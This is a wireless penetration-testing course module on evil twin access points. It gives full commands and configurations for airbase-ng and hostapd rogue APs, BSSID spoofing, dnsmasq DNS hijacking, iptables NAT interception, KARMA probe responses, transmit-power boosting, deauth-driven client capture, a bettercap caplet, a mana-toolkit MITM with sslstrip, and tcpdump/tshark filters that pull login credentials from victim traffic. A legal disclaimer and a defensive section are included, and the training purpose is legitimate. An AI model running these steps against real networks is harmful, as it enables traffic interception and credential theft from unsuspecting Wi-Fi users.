# Module 09 — Evil Twin Access Points

> **Prerequisites:** [Module 08 — Deauthentication & Wireless DoS](../module-08-deauth-dos/)
> **Next Module:** [Module 10 — Captive Portals & Credential Harvesting](../module-10-captive-portal/)

> **Legal Disclaimer:** Evil Twin attacks must only be performed on networks you own or have **explicit written permission** to test. Unauthorized rogue AP operations may violate laws including the CFAA, the UK Computer Misuse Act, and wireless communications regulations worldwide.

---

## Table of Contents

1. [What Is an Evil Twin Attack?](#1-what-is-an-evil-twin-attack)
2. [Attack Prerequisites & Environment](#2-attack-prerequisites--environment)
3. [Creating a Rogue AP with airbase-ng](#3-creating-a-rogue-ap-with-airbase-ng)
4. [Configuring hostapd for a Rogue AP](#4-configuring-hostapd-for-a-rogue-ap)
5. [DHCP & DNS with dnsmasq](#5-dhcp--dns-with-dnsmasq)
6. [Enabling IP Forwarding & Routing](#6-enabling-ip-forwarding--routing)
7. [KARMA Attacks — Probing for Victims](#7-karma-attacks--probing-for-victims)
8. [Signal Strength Manipulation](#8-signal-strength-manipulation)
9. [Using bettercap in AP Mode](#9-using-bettercap-in-ap-mode)
10. [Detection & Countermeasures](#10-detection--countermeasures)
11. [Knowledge Check](#11-knowledge-check)

---

## 1. What Is an Evil Twin Attack?

### Overview

An **Evil Twin** is a rogue wireless access point that impersonates a legitimate AP by broadcasting the same SSID (and optionally spoofing the BSSID). Clients are tricked into associating with the attacker's AP instead of the real one.

```
Legitimate Network              Evil Twin Attack
─────────────────               ──────────────────────────────────
  [Router/AP]                     [Attacker Laptop]
  SSID: "CoffeeShop"              SSID: "CoffeeShop"  ← same name
  BSSID: AA:BB:CC:DD:EE:FF        BSSID: AA:BB:CC:DD:EE:FF  ← spoofed
  Channel: 6                      Channel: 6 (or same)
      ↑                               ↑
  [Client]  ←─────────────────── client connects to attacker
```

### Attack Goals

| Goal | Technique |
|------|-----------|
| Credential harvesting | Captive portal login page (Module 10) |
| Traffic interception (MITM) | Route client through attacker's NAT |
| WPA2-Enterprise hash theft | hostapd-wpe + RADIUS emulation (Module 13) |
| Denial of Service pivot | Force client to connect to a non-functional AP |
| Reconnaissance | Observe client DNS, HTTP traffic |

### Why It Works

When a client scans for networks, it sees SSIDs by name. If two APs broadcast the same SSID, the client will associate with whichever has:
1. The stronger signal
2. An already-known BSSID (saved in its profile)
3. The most recently connected record

An attacker can combine deauthentication (Module 08) to kick the client off the real AP and boost transmit power to ensure the evil twin appears stronger.

---

## 2. Attack Prerequisites & Environment

### Required Components

| Component | Tool | Purpose |
|-----------|------|---------|
| Rogue AP daemon | `hostapd` or `airbase-ng` | Broadcast fake SSID |
| DHCP server | `dnsmasq` | Assign IP to victim |
| DNS server | `dnsmasq` | Resolve domain queries |
| Routing / NAT | `iptables` | Forward victim traffic |
| Deauth engine | `aireplay-ng` | Push clients off real AP |

### Hardware Needed

You need **at least one** wireless adapter in monitor/AP mode. For a full MITM setup you ideally have two adapters:

- **wlan0** — connected to real internet (or an upstream AP) for forwarding victim traffic
- **wlan1** — set to AP mode to host the evil twin

If you only have one adapter, you can still run the evil twin in isolation (no internet forwarding) for credential-harvesting scenarios.

### Adapter Setup

```bash
# Kill NetworkManager conflicts
sudo systemctl stop NetworkManager
sudo airmon-ng check kill

# Verify adapter supports AP mode
iw phy phy0 info | grep -A 10 "Supported interface modes"
# Should list "AP" in the output

# Set the attacker adapter to AP mode (hostapd handles this)
# No need to manually put into monitor mode for hostapd
```

---

## 3. Creating a Rogue AP with airbase-ng

`airbase-ng` is part of the aircrack-ng suite and can quickly create a software access point. It is less feature-rich than `hostapd` but requires no configuration file.

### Basic Open Rogue AP

```bash
# Put interface into monitor mode first
sudo airmon-ng start wlan1

# Create an open AP matching the target SSID
sudo airbase-ng -e "CoffeeShop" -c 6 wlan1mon

# -e  SSID to broadcast
# -c  Channel (match the legitimate AP)
```

### BSSID Spoofing with airbase-ng

```bash
# Spoof the MAC address of the legitimate AP
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan1
sudo airbase-ng -e "CoffeeShop" -c 6 -a AA:BB:CC:DD:EE:FF wlan1mon

# -a  Force the BSSID (AP MAC address)
```

### airbase-ng Output

When running, `airbase-ng` creates a virtual tap interface (`at0`) that acts as the AP's network interface:

```
22:00:00  Created tap interface at0
22:00:01  Trying to set MTU on at0 to 1500
22:00:01  Access Point with BSSID AA:BB:CC:DD:EE:FF started.
```

You then configure `at0` with an IP address and run `dnsmasq` against it.

### WPA2 Rogue AP with airbase-ng

```bash
# WPA2-PSK rogue AP (for password capture via handshake or portal)
sudo airbase-ng -e "CoffeeShop" -z 4 -W 1 -c 6 wlan1mon

# -z 4   WPA2 (CCMP/AES)
# -W 1   Set WEP/WPA flag in beacon
```

---

## 4. Configuring hostapd for a Rogue AP

`hostapd` is the production-grade software AP daemon used in Linux. It is far more configurable than `airbase-ng` and is used in enterprise attacks (Module 13).

### Installation

```bash
sudo apt install hostapd
```

### Basic Open AP Configuration

Create `/etc/hostapd/evil-twin.conf`:

```ini
# Interface that will act as the AP
interface=wlan1

# 802.11 driver (nl80211 for modern Linux)
driver=nl80211

# SSID to broadcast (match your target)
ssid=CoffeeShop

# Radio band: a = 5 GHz, g = 2.4 GHz
hw_mode=g

# Channel (must match target AP's channel)
channel=6

# No authentication (open network)
auth_algs=1
wpa=0

# Enable beacon broadcasting
beacon_int=100
dtim_period=2

# Max clients
max_num_sta=255

# Logging
logger_syslog=-1
logger_stdout=-1
```

### Running hostapd

```bash
sudo hostapd /etc/hostapd/evil-twin.conf

# Verbose output (useful for debugging)
sudo hostapd -d /etc/hostapd/evil-twin.conf

# Expected output:
# wlan1: AP-ENABLED
# wlan1: interface state UNINITIALIZED->ENABLED
```

### WPA2-PSK Rogue AP with hostapd

If you want clients to authenticate with a known passphrase (e.g., to capture the 4-way handshake):

```ini
interface=wlan1
driver=nl80211
ssid=CoffeeShop
hw_mode=g
channel=6

# WPA2-PSK
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=password123
```

### BSSID Spoofing with hostapd

```bash
# Spoof MAC before starting hostapd
sudo ip link set wlan1 down
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan1
sudo ip link set wlan1 up
sudo hostapd /etc/hostapd/evil-twin.conf
```

---

## 5. DHCP & DNS with dnsmasq

Once clients associate with your evil twin, they need an IP address. `dnsmasq` handles both DHCP assignment and DNS resolution.

### Installation

```bash
sudo apt install dnsmasq
```

### Configure the AP Interface IP

Before starting `dnsmasq`, assign an IP to the AP interface:

```bash
# For airbase-ng (uses at0 interface)
sudo ip addr add 10.0.0.1/24 dev at0
sudo ip link set at0 up

# For hostapd (uses the actual wlan1 interface)
sudo ip addr add 10.0.0.1/24 dev wlan1
```

### dnsmasq Configuration

Create `/etc/dnsmasq_evil.conf`:

```ini
# Interface to serve DHCP/DNS on
interface=at0                # or wlan1 for hostapd

# Do not use /etc/resolv.conf
no-resolv

# Upstream DNS (Google DNS — routes real DNS queries)
server=8.8.8.8
server=8.8.4.4

# DHCP address pool and lease time
dhcp-range=10.0.0.10,10.0.0.100,12h

# Gateway (us)
dhcp-option=3,10.0.0.1

# DNS server (us)
dhcp-option=6,10.0.0.1

# Log DHCP transactions (useful for recon)
log-dhcp
log-queries

# Optional: set specific hostname for the fake AP
dhcp-option=15,fake.local
```

### Running dnsmasq

```bash
sudo dnsmasq -C /etc/dnsmasq_evil.conf --no-daemon

# Check it is running
sudo ss -ulnp | grep 53
```

### DNS Hijacking for Captive Portal

To redirect ALL DNS queries to your machine (for Module 10 captive portal):

```ini
# In dnsmasq config — respond to ALL queries with your IP
address=/#/10.0.0.1
```

This returns `10.0.0.1` for every domain name, forcing clients to your captive portal.

---

## 6. Enabling IP Forwarding & Routing

To act as a transparent MITM gateway (clients can reach the internet through you), enable IP forwarding and set up NAT with iptables.

### Enable IP Forwarding

```bash
# Temporary (until reboot)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Permanent
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

### Set Up NAT with iptables

```bash
# Assume:
# wlan0 = upstream (internet-facing) interface
# at0   = evil twin AP interface (or wlan1 for hostapd)

# Flush existing rules
sudo iptables -F
sudo iptables -t nat -F

# Enable NAT masquerading
sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE

# Forward traffic from evil twin interface to internet
sudo iptables -A FORWARD -i at0 -o wlan0 -j ACCEPT
sudo iptables -A FORWARD -i wlan0 -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

### Verify Forwarding is Working

```bash
# From a connected client, ping the gateway
ping 10.0.0.1

# On attacker, watch traffic
sudo tcpdump -i at0 -n
```

---

## 7. KARMA Attacks — Probing for Victims

### What Is a KARMA Attack?

A **KARMA attack** exploits the way clients broadcast **Probe Request** frames to find previously connected networks. When a client's Wi-Fi is enabled but not connected, it sends probe requests asking "Is anyone broadcasting SSID 'HomeNetwork'?"

A KARMA-enabled rogue AP responds to **every** probe request, regardless of SSID, claiming to be whatever network the client is looking for.

```
Client probe: "Is 'Starbucks_WiFi' around?"
KARMA AP:     "Yes! I am Starbucks_WiFi"  ← responds to all probes
Client:       connects automatically
```

### Why KARMA Works

- Clients on most operating systems automatically connect to known networks without user interaction
- Pre-WPA3, clients would attempt open-network auto-connect
- Even WPA2 clients may probe for remembered open networks

### Enabling KARMA with hostapd

`hostapd` does not natively support KARMA, but `hostapd-karma` (a patch) or `bettercap` (Module 9.9) provide this capability.

Alternatively, use `airbase-ng` with the `-P` flag:

```bash
# KARMA mode in airbase-ng
# Respond to all probe requests with matching SSID
sudo airbase-ng -P -C 30 -e "default" wlan1mon

# -P    Enable KARMA (respond to all probes)
# -C 30 Broadcast beacon for 30 seconds per discovered SSID
# -e    Default SSID when no probe matches
```

### Passive SSID Discovery Before KARMA

Before launching KARMA, collect probe requests to know what networks to impersonate:

```bash
# Capture all probe requests passively
sudo airodump-ng wlan1mon --output-format csv --write probes

# Then inspect the CSV for probed SSIDs
grep -i "probe" probes-01.csv
```

---

## 8. Signal Strength Manipulation

Clients prefer the AP with the strongest signal. To guarantee the evil twin wins over the legitimate AP, you can boost your transmit power.

### Increase Transmit Power

```bash
# Check current regulatory domain
iw reg get

# Set to Bolivia (BO) — fewer power restrictions (use only in lab!)
sudo iw reg set BO

# Set transmit power (in mBm: 30 dBm = 30 * 100 = 3000 mBm)
sudo iw dev wlan1 set txpower fixed 3000

# Verify
iwconfig wlan1 | grep -i "tx-power"
```

> **Note:** Regulatory compliance varies by jurisdiction. Never exceed legal limits in your country during authorized tests.

### Combining Deauth + Evil Twin

The canonical evil twin workflow:

```bash
# Step 1: Identify the legitimate AP
sudo airodump-ng wlan0mon
# Note: BSSID, channel, SSID

# Step 2: Start the evil twin on that channel with the same SSID
sudo hostapd /etc/hostapd/evil-twin.conf &

# Step 3: Start DHCP/DNS
sudo dnsmasq -C /etc/dnsmasq_evil.conf --no-daemon &

# Step 4: Enable forwarding & NAT
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Step 5: Deauth clients from legitimate AP (Module 08)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Clients disconnect from real AP, see evil twin with same name, connect
```

---

## 9. Using bettercap in AP Mode

`bettercap` is an all-in-one MITM framework that can automate the evil twin setup including DHCP, DNS hijacking, and traffic interception.

### Installation

```bash
sudo apt install bettercap
# Or install latest from GitHub:
# go install github.com/bettercap/bettercap@latest
```

### Launching bettercap AP Mode

```bash
# Start bettercap interactively
sudo bettercap -iface wlan1

# Inside bettercap interactive shell:
> wifi.recon on                     # Start passive scanning
> wifi.show                         # List nearby APs

# Create an evil twin of a specific AP
> set wifi.ap.ssid CoffeeShop
> set wifi.ap.bssid AA:BB:CC:DD:EE:FF
> set wifi.ap.channel 6
> wifi.ap on                        # Start evil twin AP

# Automatic DHCP
> set dhcp6.server on
> dhcp.server on

# DNS spoofing (all domains → you)
> set dns.spoof.domains *
> dns.spoof on
```

### bettercap Caplet for Full Automation

Save as `evil-twin.cap`:

```
set wifi.ap.ssid CoffeeShop
set wifi.ap.bssid AA:BB:CC:DD:EE:FF
set wifi.ap.channel 6

wifi.ap on
dhcp.server on
dns.spoof on

set dns.spoof.domains *
set http.proxy on
http.proxy on
```

Run with:

```bash
sudo bettercap -iface wlan1 -caplet evil-twin.cap
```

---

## 10. Detection & Countermeasures

### How Defenders Detect Evil Twins

| Detection Method | How It Works |
|-----------------|--------------|
| BSSID monitoring | Multiple APs with same SSID but different BSSIDs |
| Signal anomaly | Sudden appearance of stronger signal from new AP |
| WIDS/WIPS systems | Wireless Intrusion Detection/Prevention (e.g., Cisco CleanAir) |
| Certificate pinning | Client rejects unexpected SSL/TLS certs |
| 802.1X / EAP validation | Server certificate mismatch triggers warning |

### Wireless Intrusion Prevention

Enterprise environments use **WIPS** (Wireless Intrusion Prevention Systems) that:
- Monitor all 802.11 beacons across channels
- Alert on duplicate SSIDs with differing BSSIDs
- Automatically deauthenticate unauthorized APs

### Client-Side Mitigations

```bash
# On Windows — view trusted Wi-Fi profiles
netsh wlan show profiles

# Delete untrusted auto-connect profiles
netsh wlan delete profile name="CoffeeShop"
```

- **Use a VPN** — even if clients connect to an evil twin, all traffic is encrypted
- **HTTP Strict Transport Security (HSTS)** — browsers refuse to load pages over HTTP for HSTS-pinned domains
- **Verify SSL certificates** — always check for certificate warnings
- **Disable auto-connect** on mobile devices for public networks

### Attacker OPSEC

During authorized tests:
- Contain signal with directional antenna to authorized area
- Log all client MACs that connect
- Immediately restore connectivity after test
- Document which clients were affected in your report

---

## 10b. mana-toolkit — Dedicated KARMA Attack Suite

The **MANA toolkit** (successor to KARMA) is a comprehensive rogue AP suite that improves on KARMA with better probe detection and more attack modes.

```bash
# Install
sudo apt install mana-toolkit

# Key scripts in /usr/share/mana-toolkit/run-mana/:
# start-noupstream.sh    — No internet forwarding (credential only)
# start-nat-simple.sh    — NAT forwarding with internet
# start-nat-full.sh      — Full MITM with sslstrip and bdfproxy

# Configure target SSID and channel in:
# /etc/mana-toolkit/hostapd-karma.conf

# Run full MITM evil twin
sudo bash /usr/share/mana-toolkit/run-mana/start-nat-full.sh
```

## 10c. Traffic Interception & Credential Capture

Once clients are connected through your evil twin, capture their traffic:

```bash
# Capture ALL victim traffic
sudo tcpdump -i wlan1 -w victim_traffic.pcap

# Filter HTTP POST requests (login forms)
sudo tcpdump -i wlan1 -A -l port 80 | grep -i 'user\|pass\|login\|email'

# Live DNS query monitoring (see what sites victim visits)
sudo tshark -i wlan1 \
  -Y "dns.qry.name" \
  -T fields \
  -e ip.src \
  -e dns.qry.name

# Watch for HTTP credentials in real-time with tshark
sudo tshark -i wlan1 -Y "http.request.method==POST" \
  -T fields -e ip.src -e http.request.uri -e http.file_data

# SSL stripping (bettercap) — downgrades HTTPS to HTTP where possible
# Inside bettercap shell:
# set http.proxy.sslstrip true
# http.proxy on
# net.sniff on
# Note: HSTS-preloaded domains (Google, banks) CANNOT be stripped
```

## 10d. Full airbase-ng Flag Reference

```bash
airbase-ng [options] <interface_in_monitor_mode>

# Core flags:
# -e <SSID>    → SSID to broadcast (match target)
# -a <BSSID>   → Force specific BSSID (spoof legitimate AP MAC)
# -c <channel> → Channel to operate on
# -z <type>    → Cipher: 1=WEP, 2=WPA-TKIP, 3=WPA2, 4=WPA2-CCMP
# -W 1         → Set WPA/WPA2 flag in beacon (required with -z)
# -P           → KARMA mode: respond to all probe requests
# -C <secs>    → Broadcast each discovered SSID for N seconds (with -P)
# -I <secs>    → Beacon interval in ms (default: 100)
# -v           → Verbose output (show all frames)
# -A           → Ad-hoc mode (IBSS)
# -M           → Transmit raw management frames only

# WPA2 rogue AP example:
sudo airbase-ng -e "CoffeeShop" -z 4 -W 1 -c 6 -a AA:BB:CC:DD:EE:FF wlan1mon

# KARMA + WPA2:
sudo airbase-ng -P -C 30 -z 4 -W 1 -e "default" wlan1mon
```

## 11. Knowledge Check

Before proceeding to Module 10, you should be able to answer:

1. What is an Evil Twin attack and what conditions make a client connect to the rogue AP instead of the legitimate one?
2. What is the difference between using `airbase-ng` and `hostapd` for creating a rogue AP? Name one advantage of each.
3. Write the `hostapd` configuration block that creates an open AP named "FreeWifi" on channel 11 using the nl80211 driver.
4. What does `dnsmasq` provide in an evil twin setup, and what configuration directive redirects ALL DNS queries to the attacker's IP?
5. Explain the `iptables` NAT command that allows evil twin clients to access the internet through the attacker's machine.
6. What is a KARMA attack and what type of 802.11 frame does it exploit?
7. How does `airbase-ng -P` differ from a standard evil twin, and what is `-C 30` used for?
8. What transmit power setting technique can give an evil twin a signal advantage, and why should this be used cautiously?
9. Name three network-side detection mechanisms for evil twin attacks.
10. What client-side mitigation is effective even after a client has been tricked into connecting to an evil twin?

---

**Next:** [Module 10 — Captive Portals & Credential Harvesting](../module-10-captive-portal/)
